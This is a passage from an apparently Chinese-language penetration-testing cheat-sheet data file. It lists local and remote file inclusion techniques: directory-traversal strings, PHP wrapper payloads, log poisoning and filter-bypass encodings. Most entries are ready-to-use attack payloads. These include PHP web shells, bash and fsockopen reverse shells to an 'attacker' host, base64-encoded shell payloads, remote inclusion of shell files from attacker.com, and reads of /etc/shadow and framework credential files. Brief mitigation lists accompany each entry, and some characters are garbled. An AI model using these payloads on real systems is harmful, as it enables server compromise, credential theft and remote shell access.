    tags: ['lfi', 'local', 'file', 'inclusion'],
    prerequisites: ['存在文件包含功能', '用户可控制包含路径'],
    execution: [
      { 
        title: '1. 探测LFI', 
        command: '?file=../../../etc/passwd\n?file=....//....//....//etc/passwd\n?file=..\\..\\..\\windows\\win.ini\n?page=php://filter/convert.base64-encode/resource=index.php', 
        description: '探测本地文件包含', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '../', explanation: '上级目录遍历' },
          { part: 'etc/passwd', explanation: 'Linux用户文件' }
        ]
      },
      { 
        title: '2. 读取敏感文件', 
        command: '../../../etc/passwd\n../../../etc/shadow\n../../../var/log/apache2/access.log\n../../../proc/self/environ\n../../../proc/self/cmdline', 
        description: '读取Linux敏感文件', 
        platform: 'linux',
        syntaxBreakdown: [
          { part: '/proc/self/', explanation: '当前进程信息目录' },
          { part: 'environ', explanation: '环境变量文件' }
        ]
      },
      { 
        title: '3. PHP伪协议', 
        command: 'php://filter/convert.base64-encode/resource=config.php\nphp://input (POST数据作为输入)\nphp://data://text/plain,<?php phpinfo();?>\nphar://archive.zip/shell.php', 
        description: '使用PHP伪协议', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'php://filter', explanation: 'PHP Filter伪协议' },
          { part: 'php://input', explanation: '读取POST数据' },
          { part: 'data://', explanation: 'Data伪协议' }
        ]
      },
      { 
        title: '4. 日志投毒', 
        command: '1. 包含日志文件: ../../../var/log/apache2/access.log\n2. 在User-Agent中注入: <?php system($_GET[\'c\']); ?>\n3. 访问: ?file=../../../var/log/apache2/access.log&c=id', 
        description: '通过日志投毒获取RCE', 
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'access.log', explanation: 'Apache访问日志' },
          { part: 'User-Agent', explanation: '用户代理�' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: '目录遍历绕过', 
        command: '....//....//....//etc/passwd\n..%252f..%252f..%252fetc/passwd\n..%c0%af..%c0%af..%c0%afetc/passwd\n....\/....\/....\/etc/passwd', 
        description: '绕过目录遍历过滤', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '%252f', explanation: '双重URL编码的斜杠' },
          { part: '%c0%af', explanation: 'UTF-8编码的斜杠' }
        ]
      },
      { 
        title: '后缀绕过', 
        command: '../../../etc/passwd%00\n../../../etc/passwd%00.jpg\n../../../etc/passwd/.jpg\nphp://filter/convert.base64-encode/resource=config.php%00', 
        description: '绕过文件后缀检查', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '%00', explanation: '空字节截断' }
        ]
      }
    ],
    tutorial: {
      overview: '本地文件包含(LFI)漏洞允许攻击者通过操纵文件路径参数读取服务器上的任意文件，包括配置文件、源代码、密码文件等敏感信息，严重时可结合日志投毒等技术实现远程代码执行。',
      vulnerability: 'LFI漏洞源于应用程序将用户输入直接拼接到文件操作函数(如PHP的include/require/fopen)中。攻击者使用../目录遍历符号访问Web根目录之外的文件，如/etc/passwd、/etc/shadow、应用配置文件等。',
      exploitation: '完�利用流程：\n1. 探测文件包含点\n2. 使用目录遍历读取敏感文件\n3. 使用伪协议读取源码\n4. 通过日志投毒获取RCE',
      mitigation: '防御措施：\n1. 使用白名单验证文件名\n2. 禁用PHP伪协议\n3. 使用basename()处理路径\n4. 限制包含目录',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'rfi-basic',
    name: '远程文件包含',
    description: '远程文件包含漏�利用技术',
    category: 'LFI/RFI文件包含',
    subCategory: '远程包含',
    tags: ['rfi', 'remote', 'file', 'inclusion'],
    prerequisites: ['存在文件包含功能', 'allow_url_include=On', '用户可控制包含路径'],
    execution: [
      { 
        title: '1. 探测RFI', 
        command: '?file=http://attacker.com/shell.txt\n?file=http://attacker.com/shell.txt%00\n?file=http://attacker.com/shell.txt?', 
        description: '探测远程文件包含', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'http://', explanation: '远程URL协议' },
          { part: 'attacker.com', explanation: '攻击者服务器' },
          { part: '%00', explanation: '空字节截断绕过后缀' }
        ]
      },
      { 
        title: '2. 托管恶意文件', 
        command: '# shell.txt内容\n<?php system($_GET[\'cmd\']); ?>\n\n# 访问\n?file=http://attacker.com/shell.txt&cmd=id', 
        description: '托管恶意文件并执行', 
        platform: 'all',
      },
      { 
        title: '3. 反弹Shell', 
        command: '# shell.txt内容\n<?php system("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\""); ?>\n\n# 或使用\n<?php $sock=fsockopen("attacker",4444);exec("/bin/sh -i <&3 >&3 2>&3"); ?>', 
        description: '获取反弹Shell', 
        platform: 'linux'
      },
      { 
        title: '4. 使用data协议', 
        command: '?file=data://text/plain,<?php system($_GET[\'cmd\']); ?>&cmd=id\n?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+', 
        description: '使用data协议执行代码', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'data://', explanation: 'Data伪协议' },
          { part: 'text/plain', explanation: 'MIME类型' },
          { part: 'base64', explanation: 'Base64编码' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: '双写绕过', 
        command: '?file=htthttp://p://attacker.com/shell.txt\n?file=http://attackerattacker.com.com/shell.txt',
            syntaxBreakdown: [
              { part: '?file=htthttp://p://attacker.com/shell.txt\n?file=http://attackerattacker.com.co', explanation: '攻击载荷', type: 'value' }
            ],
        description: '双写绕过关键字过滤', 
        platform: 'all'
      },
      { 
        title: '大小写混淆', 
        command: '?file=HtTp://attacker.com/shell.txt\n?file=HTTP://attacker.com/shell.txt',
            syntaxBreakdown: [
              { part: '?file=HtTp://attacker.com/shell.txt\n?file=HTTP://attacker.com/shell.txt', explanation: '攻击载荷', type: 'value' }
            ],
        description: '大小写混淆绕过', 
        platform: 'all'
      },
      { 
        title: '协议替换', 
        command: '?file=ftp://attacker.com/shell.txt\n?file=php://filter/convert.base64-encode/resource=http://attacker.com/shell.txt',
            syntaxBreakdown: [
              { part: '?file=ftp://attacker.com/shell.txt\n?file=php://filter/convert.base64-encode/res', explanation: '攻击载荷', type: 'value' }
            ],
        description: '使用其他协议', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: '远程文件包含(RFI)允许攻击者将远程服务器上的恶意文件包含到目标应用中执行，可直接实现远程代码执行。RFI需要PHP的allow_url_include配置开启(默认关闭)。',
      vulnerability: 'RFI漏洞在LFI基础上进一步利用：当PHP的allow_url_include=On时，include()/require()函数可加载远程URL上的PHP文件并在本地执行。攻击者只需在自己的服务器上放置恶意PHP脚本即可实现RCE。',
      exploitation: '完�利用流程：\n1. 探测远程文件包含\n2. 托管恶意PHP文件\n3. 包含并执行代码\n4. 获取Shell',
      mitigation: '防御措施：\n1. 设置allow_url_include=Off\n2. 使用白名单验证文件名\n3. 禁用远程文件包含\n4. 限制包含目录',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'lfi-log-poison',
    name: '日志投毒LFI',
    description: '通过日志投毒实现LFI到RCE',
    category: 'LFI/RFI文件包含',
    subCategory: '日志投毒',
    tags: ['lfi', 'log', 'poison', 'rce'],
    prerequisites: ['存在LFI漏�', '可包含日志文件', '日志文件可写'],
    execution: [
      { 
        title: '1. 探测日志文件位置', 
        command: '# Apache日志\n../../../var/log/apache2/access.log\n../../../var/log/apache2/error.log\n../../../var/log/httpd/access_log\n../../../var/log/nginx/access.log\n\n# 系统日志\n../../../var/log/auth.log\n../../../var/log/syslog', 
        description: '探测日志文件位置', 
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'access.log', explanation: 'Apache访问日志' },
          { part: 'error.log', explanation: 'Apache错误日志' }
        ]
      },
      { 
        title: '2. 投毒User-Agent', 
        command: '# 使用curl投毒\ncurl -A "<?php system($_GET[\'c\']); ?>" http://target.com/\n\n# 或使用Burp Suite修改User-Agent\nUser-Agent: <?php system($_GET[\'c\']); ?>', 
        description: '在User-Agent中注入代码', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '-A', explanation: 'curl设置User-Agent' },
          { part: '<?php', explanation: 'PHP开始标签' }
        ]
      },
      { 
        title: '3. 投毒请求路径', 
        command: '# 在URL路径中注入\ncurl http://target.com/<?php system($_GET[\'c\']); ?>\n\n# URL编码\ncurl http://target.com/%3C%3Fphp%20system%28%24_GET%5B%27c%27%5D%29%3B%20%3F%3E', 
        description: '在请求路径中注入代码', 
        platform: 'all'
      },
      { 
        title: '4. 执行命令', 
        command: '# 包含日志文件并执行命令\n?file=../../../var/log/apache2/access.log&c=id\n?file=../../../var/log/apache2/access.log&c=whoami\n?file=../../../var/log/apache2/access.log&c=cat /etc/passwd', 
        description: '包含日志文件执行命令', 
        platform: 'linux',
        syntaxBreakdown: [
          { part: '#', explanation: '注释标记', type: 'operator' },
          { part: '# 包含日志文件并执行命令\n?file=../../../', explanation: '利用载荷', type: 'value' }
        ]
      },
      { 
        title: '5. 反弹Shell', 
        command: '?file=../../../var/log/apache2/access.log&c=bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"', 
        description: '获取反弹Shell', 
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'file', explanation: '关键参数', type: 'value' },
          { part: '../../../var/log/apache2/access.log', explanation: '关键参数', type: 'value' },
          { part: 'bash', explanation: '关键参数', type: 'value' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: '编码绕过', 
        command: '# 使用Base64编码\n<?php eval(base64_decode($_GET[\'c\'])); ?>\n# 然后传递Base64编码的命令',
        description: 'WAF绕过技术',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'eval()', explanation: '执行PHP代码', type: 'function' },
          { part: 'base64', explanation: 'Base64编码', type: 'encoding' }
        ]
      }
    ],
    tutorial: {
      overview: 'LFI日志投毒是将恶意代码注入Web服务器日志(access.log/error.log)，然后通过LFI包含该日志文件触发代码执行，是LFI漏洞从文件读取升级到RCE的经典技术。',
      vulnerability: '日志投毒利用Web服务器会将HTTP请求信息(User-Agent、Referer等)写入日志的特性。攻击者在请求头中注入PHP代码(如<?php system($_GET[cmd]);?>)，代码被写入日志后，通过LFI包含日志文件触发执行。',
      exploitation: '完�利用流程：\n1. 找到日志文件位置\n2. 在请求中注入PHP代码\n3. 包含日志文件\n4. 执行系统命令',
      mitigation: '防御措施：\n1. 限制日志文件包含\n2. 过滤日志中的特殊字符\n3. 禁用PHP执行\n4. 使用安全日志配置',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'lfi-wrapper',
    name: 'PHP伪协议利用',
    description: '利用PHP伪协议进行LFI攻击',
    category: 'LFI/RFI文件包含',
    subCategory: '伪协议',
    tags: ['lfi', 'wrapper', 'php', 'protocol'],
    prerequisites: ['存在LFI漏�', 'PHP环境', '伪协议未禁用'],
    execution: [
      { 
        title: '1. php://filter', 
        command: '# 读取源码(Base64)\n?file=php://filter/convert.base64-encode/resource=config.php\n\n# 读取源码(Rot13)\n?file=php://filter/read=string.rot13/resource=config.php\n\n# 多重过滤器\n?file=php://filter/convert.base64-encode|string.rot13/resource=config.php', 
        description: '使用php://filter读取源码', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'php://filter', explanation: 'PHP Filter伪协议' },
          { part: 'convert.base64-encode', explanation: 'Base64编码过滤器' },
          { part: 'resource=', explanation: '指定资源文件' }
        ]
      },
      { 
        title: '2. php://input', 
        command: '# POST执行PHP代码\n?file=php://input\nPOST: <?php system(\'id\'); ?>\n\n# 执行任意代码\nPOST: <?php phpinfo(); ?>\nPOST: <?php echo file_get_contents(\'/etc/passwd\'); ?>', 
        description: '使用php://input执行代码', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'php://input', explanation: '读取POST数据流' },
          { part: 'POST', explanation: 'POST请求体' }
        ]
      },
      { 
        title: '3. data://协议', 
        command: '# �接执行代码\n?file=data://text/plain,<?php system(\'id\'); ?>\n\n# Base64编码\n?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==\n\n# 执行任意命令\n?file=data://text/plain,<?php system($_GET[\'c\']); ?>&c=id', 
        description: '使用data://协议执行代码', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'data://', explanation: 'Data伪协议' },
          { part: 'text/plain', explanation: 'MIME类型' }
        ]
      },
      { 
        title: '4. phar://协议', 
        command: '# 创建phar文件\n<?php\n$p = new Phar(\'shell.phar\');\n$p->addFromString(\'shell.txt\', \'<?php system($_GET["c"]); ?>\');\n?>\n\n# 包含phar\n?file=phar://shell.phar/shell.txt&c=id', 
        description: '使用phar://协议', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'phar://', explanation: 'PHP归档协议' },
          { part: 'shell.phar', explanation: 'Phar文件' }
        ]
      },
      { 
        title: '5. zip://协议', 
        command: '# 创建zip文件\nzip shell.zip shell.txt\n# shell.txt内容: <?php system($_GET[\'c\']); ?>\n\n# 包含zip\n?file=zip://shell.zip%23shell.txt&c=id\n\n# 使用jpg+zip\ncopy shell.jpg+shell.zip shell.jpg\n?file=zip://shell.jpg%23shell.txt&c=id', 
        description: '使用zip://协议', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'zip://', explanation: 'ZIP协议' },
          { part: '%23', explanation: 'URL编码的#' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: '大小写混淆', 
        command: '?file=Php://filter/convert.base64-encode/resource=config.php\n?file=DATA://text/plain,<?php system(\'id\'); ?>',
        description: '大小写混淆绕过', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'system()', explanation: '执行系统命令', type: 'function' },
          { part: 'base64', explanation: 'Base64编码', type: 'encoding' },
          { part: 'php://filter', explanation: 'PHP流过滤器', type: 'technique' }
        ]
      },
      { 
        title: '双重URL编码', 
        command: '?file=php%3A%2F%2Ffilter/convert.base64-encode/resource=config.php\n?file=%70%68%70%3a%2f%2finput',
            syntaxBreakdown: [
              { part: '?file=php%3A%2F%2Ffilter/convert.base64-encode/resource=config.php\n?file=%70%68', explanation: '攻击载荷', type: 'value' }
            ],
        description: '双重URL编码绕过', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'PHP伪协议(Wrapper)是LFI漏洞利用的核心技术，通过php://filter读取源码、php://input执行代码、data://传递payload、zip://包含压缩文件等方式扩展LFI的攻击能力。',
      vulnerability: 'PHP伪协议漏洞利用include()等函数支持的多种流协议：php://filter可进行Base64编码读取PHP源码(避免被执行)、php://input从POST数据读取内容、data://直接嵌入数据、expect://执行系统命令(需扩展)。',
      exploitation: '完�利用流程：\n1. 探测LFI漏�\n2. 使用php://filter读取源码\n3. 使用php://input执行代码\n4. 使用data://执行任意代码',
      mitigation: '防御措施：\n1. 禁用伪协议(php.ini配置)\n2. 使用白名单验证\n3. 限制包含目录\n4. 升级PHP版本',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'lfi-traversal',
    name: '目录遍历技术',
    description: 'LFI目录遍历绕过技术',
    category: 'LFI/RFI文件包含',
    subCategory: '目录遍历',
    tags: ['lfi', 'traversal', 'bypass', 'path'],
    prerequisites: ['存在LFI漏�', '存在路径过滤'],
    execution: [
      { 
        title: '1. 基础遍历', 
        command: '../../../etc/passwd\n../../../../etc/passwd\n../../../../../etc/passwd\n..\\..\\..\\windows\\win.ini', 
        description: '基础目录遍历', 
        platform: 'all',
      },
      { 
        title: '2. 绕过删除../', 
        command: '....//....//....//etc/passwd\n....//....//etc/passwd\n..././..././..././etc/passwd', 
        description: '绕过删除../的过滤', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '....//', explanation: '删除../后变成../' },
          { part: '..././', explanation: '删除../后变成../' }
        ]
      },
      { 
        title: '3. URL编码绕过', 
        command: '..%2f..%2f..%2fetc/passwd\n..%252f..%252f..%252fetc/passwd\n%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd', 
        description: 'URL编码绕过', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '%2f', explanation: '斜杠URL编码' },
          { part: '%252f', explanation: '双重URL编码' },
          { part: '%2e%2e', explanation: '点号URL编码' }
        ]
      },
      { 
        title: '4. Unicode编码绕过', 
        command: '..%c0%af..%c0%af..%c0%afetc/passwd\n..%c1%9c..%c1%9c..%c1%9cwindows\\win.ini\n..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd', 
        description: 'Unicode编码绕过', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '%c0%af', explanation: 'UTF-8编码的斜杠' },
          { part: '%c1%9c', explanation: 'UTF-8编码的反斜杠' }
        ]
      },
      { 
        title: '5. 绝对路径绕过', 
        command: '/etc/passwd\n/etc/shadow\n/var/log/apache2/access.log\nC:/windows/win.ini\nC:\\windows\\system32\\config\\sam', 
        description: '使用绝对路径', 
        },
      ],
    wafBypass: [
      { 
        title: '混合编码', 
        command: '..%2f..%c0%af..%2fetc/passwd\n%2e%2e/%2e%2e/%2e%2e/etc/passwd',
            syntaxBreakdown: [
              { part: '..%2f..%c0%af..%2fetc/passwd\n%2e%2e/%2e%2e/%2e%2e/etc/passwd', explanation: '攻击载荷', type: 'value' }
            ],
        description: '混合编码绕过', 
        platform: 'all'
      },
      { 
        title: '空字节截断', 
        command: '../../../etc/passwd%00\n../../../etc/passwd%00.jpg\n../../../etc/passwd%00.html', 
        description: '空字节截断绕过后缀', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '%00', explanation: '空字节截断' }
        ]
      },
      { 
        title: '点号截断(Windows)', 
        command: '../../../windows/win.ini.\n../../../windows/win.ini...\n../../../boot.ini……',
            syntaxBreakdown: [
              { part: '../../../windows/win.ini.\n../../../windows/win.ini...\n../../../boot.ini……', explanation: '攻击载荷', type: 'value' }
            ],
        description: 'Windows点号截断', 
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: '目录遍历(Path Traversal)是最基础的LFI利用方式，通过../序列突破应用限定的目录范围，访问文件系统上的任意文件。各种编码和路径规范化技巧可绕过简单的过滤措施。',
      vulnerability: '目录遍历漏洞在应用仅做简单字符串过滤(如替换../)时仍可被绕过：双写(....//→../)、URL编码(%2e%2e%2f)、Unicode编码、混合大小写、操作系统路径差异(Windows反斜杠)等多种绕过技术。',
      exploitation: '完�利用流程：\n1. 探测LFI漏�\n2. 尝试基础遍历\n3. 使用编码绕过\n4. 读取敏感文件',
      mitigation: '防御措施：\n1. 使用basename()处理路径\n2. 白名单验证文件名\n3. 禁用特殊字符\n4. 使用realpath()验证',
      difficulty: 'beginner'
    }
  },
  {
    id: 'lfi-php-filter',
    name: 'PHP Filter链攻击',
    description: '利用PHP Filter链进行LFI攻击',
    category: 'LFI/RFI文件包含',
    subCategory: 'PHP Filter',
    tags: ['lfi', 'php', 'filter', 'chain'],
    prerequisites: ['存在LFI漏�', 'PHP环境', 'filter伪协议可用'],
    execution: [
      { 
        title: '1. 读取源码', 
        command: '# Base64编码读取\n?file=php://filter/convert.base64-encode/resource=index.php\n\n# Rot13读取\n?file=php://filter/read=string.rot13/resource=index.php\n\n# 字符转换\n?file=php://filter/read=string.toupper/resource=index.php', 
        description: '使用Filter读取源码', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'convert.base64-encode', explanation: 'Base64编码过滤器' },
          { part: 'string.rot13', explanation: 'Rot13编码过滤器' }
        ]
      },
      { 
        title: '2. 多重过滤器', 
        command: '# 多重编码\n?file=php://filter/convert.base64-encode|string.rot13/resource=config.php\n\n# 去除PHP标签\n?file=php://filter/read=string.strip_tags/resource=index.php', 
        description: '使用多重过滤器', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '|', explanation: '过滤器链接符' },
          { part: 'string.strip_tags', explanation: '去除HTML/PHP标签' }
        ]
      },
      { 
        title: '3. Filter链RCE', 
        command: '# 使用iconv过滤器\n?file=php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php\n\n# 使用zlib压缩\n?file=php://filter/zlib.deflate/resource=index.php\n?file=php://filter/zlib.inflate/resource=data', 
        description: '使用高级过滤器', 
        platform: 'all'
      },
      { 
        title: '4. 读取配置文件', 
        command: '# WordPress配置\n?file=php://filter/convert.base64-encode/resource=wp-config.php\n\n# Laravel .env\n?file=php://filter/convert.base64-encode/resource=../.env\n\n# ThinkPHP配置\n?file=php://filter/convert.base64-encode/resource=application/database.php', 
        description: '读取常见框架配置', 
        syntaxBreakdown: [
          { part: 'base64', explanation: 'Base64编码', type: 'encoding' },
          { part: 'php://filter', explanation: 'PHP流过滤器', type: 'technique' }
        ]
        },
      ],
    wafBypass: [
      { 
        title: '大小写混淆', 
        command: '?file=PHP://FILTER/CONVERT.BASE64-ENCODE/RESOURCE=config.php\n?file=PhP://FiLtEr/convert.base64-encode/resource=config.php',
            syntaxBreakdown: [
              { part: '?file=PHP://FILTER/CONVERT.BASE64-ENCODE/RESOURCE=config.php\n?file=PhP://FiLtEr', explanation: '攻击载荷', type: 'value' }
            ],
        description: '大小写混淆绕过', 
        platform: 'all'
      },
      { 
        title: '编码绕过', 
        command: '?file=%70%68%70%3a%2f%2f%66%69%6c%74%65%72/convert.base64-encode/resource=config.php',
            syntaxBreakdown: [
              { part: '?file=%70%68%70%3a%2f%2f%66%69%6c%74%65%72/convert.base64-encode/resource=config', explanation: '攻击载荷', type: 'value' }
            ],
        description: 'URL编码绕过', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'php://filter是LFI漏洞利用中最实用的伪协议，可对文件内容进行各种转换(Base64编码/解码、ROT13等)后输出，最常见用途是读取PHP源代码(避免被服务器解析执行而看不到源码)。',
      vulnerability: 'php://filter通过链式过滤器对数据流进行转换：convert.base64-encode将PHP源码编码为Base64字符串输出(避免执行)、string.rot13进行ROT13变换、convert.iconv进行字符集转换。过滤器链可组合实现更复杂的数据操作。',
      exploitation: '完�利用流程：\n1. 探测LFI漏�\n2. 使用Base64编码读取源码\n3. 解码获取源码\n4. 分析源码找其他漏�',
      mitigation: '防御措施：\n1. 禁用php://filter\n2. 白名单验证文件名\n3. 使用realpath()验证\n4. 限制包含目录',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'lfi-php-input',
    name: 'PHP Input执行',
    description: '利用php://input执行PHP代码',
    category: 'LFI/RFI文件包含',
    subCategory: 'PHP Input',
    tags: ['lfi', 'php', 'input', 'rce'],
    prerequisites: ['存在LFI漏�', 'allow_url_include=On', 'POST方法可用'],
    execution: [
      { 
        title: '1. 基础执行', 
        command: '# GET请求\nGET ?file=php://input\n\n# POST数据\nPOST: <?php system(\'id\'); ?>\nPOST: <?php echo \'Hello\'; ?>', 
        description: '使用php://input执行代码', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'php://input', explanation: '读取POST数据流' },
          { part: '<?php', explanation: 'PHP开始标签' }
        ]
      },
      { 
        title: '2. 命令执行', 
        command: '# 执行系统命令\nPOST: <?php system($_GET[\'c\']); ?>\n# 然后访问: ?file=php://input&c=id\n\n# 使用exec\nPOST: <?php echo exec(\'id\'); ?>\n\n# 使用shell_exec\nPOST: <?php echo shell_exec(\'id\'); ?>', 
        description: '执行系统命令', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'system()', explanation: '执行命令并输出' },
          { part: 'exec()', explanation: '执行命令返回最后一行' },
          { part: 'shell_exec()', explanation: '执行命令返回全部输出' }
        ]
      },
      { 
        title: '3. 文件操作', 
        command: '# 读取文件\nPOST: <?php echo file_get_contents(\'/etc/passwd\'); ?>\n\n# 写入文件\nPOST: <?php file_put_contents(\'shell.php\', \'<?php system($_GET["c"]); ?>\'); ?>\n\n# 列出目录\nPOST: <?php print_r(scandir(\'.\')); ?>', 
        description: '文件操作', 
        platform: 'all'
      },
      { 
        title: '4. 反弹Shell', 
        command: 'POST: <?php system("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\""); ?>\n\n# 或使用\nPOST: <?php $sock=fsockopen("attacker",4444);exec("/bin/sh -i <&3 >&3 2>&3"); ?>', 
        description: '获取反弹Shell', 
        platform: 'linux'
      }
    ],
    wafBypass: [
      { 
        title: '编码绕过', 
        command: '# Base64编码\nPOST: <?php eval(base64_decode(\'c3lzdGVtKCRfR0VUWydjJ10pOw==\')); ?>\n# 解码后: system($_GET[\'c\']);\n\n# Rot13编码\nPOST: <?php eval(str_rot13(\'flfgrz($_TRG[\'p\']);\')); ?>',
        description: '使用编码绕过', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'system()', explanation: '执行系统命令', type: 'function' },
          { part: 'eval()', explanation: '执行PHP代码', type: 'function' },
          { part: 'base64', explanation: 'Base64编码', type: 'encoding' }
        ]
      },
      { 
        title: '短标签', 
        command: 'POST: <?=system($_GET[\'c\']);?>\nPOST: <?=`$_GET[c]`?>',
        description: 'WAF绕过技术',
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'php://input伪协议可从HTTP请求的POST body中读取原始数据，当与include()结合时，攻击者可通过POST body传递PHP代码实现远程代码执行(需allow_url_include=On)。',
      vulnerability: 'php://input将POST请求体作为数据流提供给文件包含函数。当include("php://input")被执行时，POST body中的PHP代码将被解析执行。此方式不需要在服务器上创建文件，直接在内存中执行恶意代码。',
      exploitation: '完�利用流程：\n1. 探测LFI漏�\n2. 使用php://input\n3. POST PHP代码\n4. 获取Shell',
      mitigation: '防御措施：\n1. 设置allow_url_include=Off\n2. 禁用php://input\n3. 白名单验证\n4. 限制POST内容',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'lfi-php-data',
    name: 'PHP Data协议攻击',
    description: '利用data://协议执行PHP代码',
    category: 'LFI/RFI文件包含',
    subCategory: 'PHP Data',
    tags: ['lfi', 'php', 'data', 'protocol'],
    prerequisites: ['存在LFI漏�', 'allow_url_include=On', 'data协议可用'],
    execution: [
      { 
        title: '1. 基础执行', 
        command: '# �接执行\n?file=data://text/plain,<?php system(\'id\'); ?>\n\n# 执行phpinfo\n?file=data://text/plain,<?php phpinfo(); ?>\n\n# 输出文本\n?file=data://text/plain,Hello World', 
        description: '使用data://协议执行代码', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'data://', explanation: 'Data伪协议' },
          { part: 'text/plain', explanation: 'MIME类型' },
          { part: ',', explanation: '数据分隔符' }
        ]
      },
      { 
        title: '2. Base64编码', 
        command: '# Base64编码执行\n?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==\n# 解码后: <?php system(\'id\'); ?>\n\n# 带参数执行\n?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id', 
        description: '使用Base64编码', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'base64', explanation: 'Base64编码标识' },
          { part: 'PD9waHA...', explanation: 'Base64编码的PHP代码' }
        ]
      },
      { 
        title: '3. 命令执行', 
        command: '# 交互式命令\n?file=data://text/plain,<?php system($_GET[\'c\']); ?>&c=id\n?file=data://text/plain,<?php system($_GET[\'c\']); ?>&c=whoami\n?file=data://text/plain,<?php system($_GET[\'c\']); ?>&c=cat /etc/passwd', 
        description: '执行系统命令', 
        platform: 'all'
      },
      { 
        title: '4. 反弹Shell', 
        command: '?file=data://text/plain,<?php system("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\""); ?>\n\n# Base64版本\n?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJiYXNoIC1jIFwiYmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci80NDQ0IDA+JjFcIiIpOyA/Pg==', 
        description: '获取反弹Shell', 
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'system()', explanation: '执行系统命令', type: 'function' },
          { part: 'base64', explanation: 'Base64编码', type: 'encoding' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: '大小写混淆', 
        command: '?file=DATA://TEXT/PLAIN,<?php system(\'id\'); ?>\n?file=Data://Text/Plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==',
        description: '大小写混淆绕过', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'system()', explanation: '执行系统命令', type: 'function' },
          { part: 'base64', explanation: 'Base64编码', type: 'encoding' }
        ]
      },
      { 
        title: 'URL编码', 
        command: '?file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%27%69%64%27%29%3b%20%3f%3e',
            syntaxBreakdown: [
              { part: '?file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%3c%3f%70%68%70%20%7', explanation: '攻击载荷', type: 'value' }
            ],
        description: 'URL编码绕过', 
        platform: 'all'
      },
      { 
        title: 'MIME类型变换', 
        command: '?file=data://text/html,<?php system(\'id\'); ?>\n?file=data://application/x-httpd-php,<?php system(\'id\'); ?>',
        description: '变换MIME类型', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'data://伪协议允许在URL中直接嵌入数据内容，当与LFI结合时可将PHP代码作为"文件"被包含执行。支持Base64编码，可绕过部分内容检测(需allow_url_include=On)。',
      vulnerability: 'data://协议将内联数据作为流提供给文件包含函数：data://text/plain,<?php phpinfo();?>直接传递明文PHP代码，data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+传递Base64编码后的代码，可绕过简单的关键词过滤。',
      exploitation: '完�利用流程：\n1. 探测LFI漏�\n2. 构造data:// payload\n3. 执行PHP代码\n4. 获取Shell',
      mitigation: '防御措施：\n1. 设置allow_url_include=Off\n2. 禁用data://协议\n3. 白名单验证\n4. 过滤特殊字符',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'lfi-php-zip',
    name: 'PHP Zip协议攻击',
    description: '利用zip://协议进行LFI攻击',
    category: 'LFI/RFI文件包含',
    subCategory: 'PHP Zip',
    tags: ['lfi', 'php', 'zip', 'archive'],
    prerequisites: ['存在LFI漏�', '可上传zip文件', 'zip协议可用'],
    execution: [
      { 
        title: '1. 创建恶意Zip', 
